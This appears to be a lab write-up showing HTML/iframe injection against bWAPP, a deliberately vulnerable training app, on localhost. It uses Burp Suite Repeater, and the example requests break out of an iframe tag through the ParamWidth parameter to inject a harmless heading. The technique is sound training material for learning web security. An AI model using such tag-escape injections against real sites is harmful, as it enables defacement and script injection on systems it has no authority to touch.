![[1 57.png]]
- Let's intercept the request in Burpsuite.
![[2 54.png]]
- We can now forward this request to the `Repeater` in order to make modifications to it.
![[3 44.png]]
- As we can see the URL is being used to complete the `<iframe>` tag.
- Let's try to escape the tag by using the following request URL:
```
GET /bWAPP/iframei.php?ParamUrl=robots.txt&ParamHeight=250&ParamWidth=250"></iframe> HTTP/1.1
```
![[4 29.png]]
- We can see that the `</iframe>` tag set by the application now is a lone closing tag. This proves that we have successfully escaped the tag.
- We can now perform a regular HTML URL injection.
```
GET /bWAPP/iframei.php?ParamUrl=robots.txt&ParamHeight=250&ParamWidth=250"></iframe><h1>GetHacked</h1> HTTP/1.1
```
![[4 30.png]]
- We can even do the same exploit directly in the browser using the following URL:
```
http://localhost/bWAPP/iframei.php?ParamUrl=robots.txt&ParamHeight=250&ParamWidth=250"></iframe><h1>GetHacked</h1>
```
![[6 10.png]]
- We can see our message `<h1>` tags.
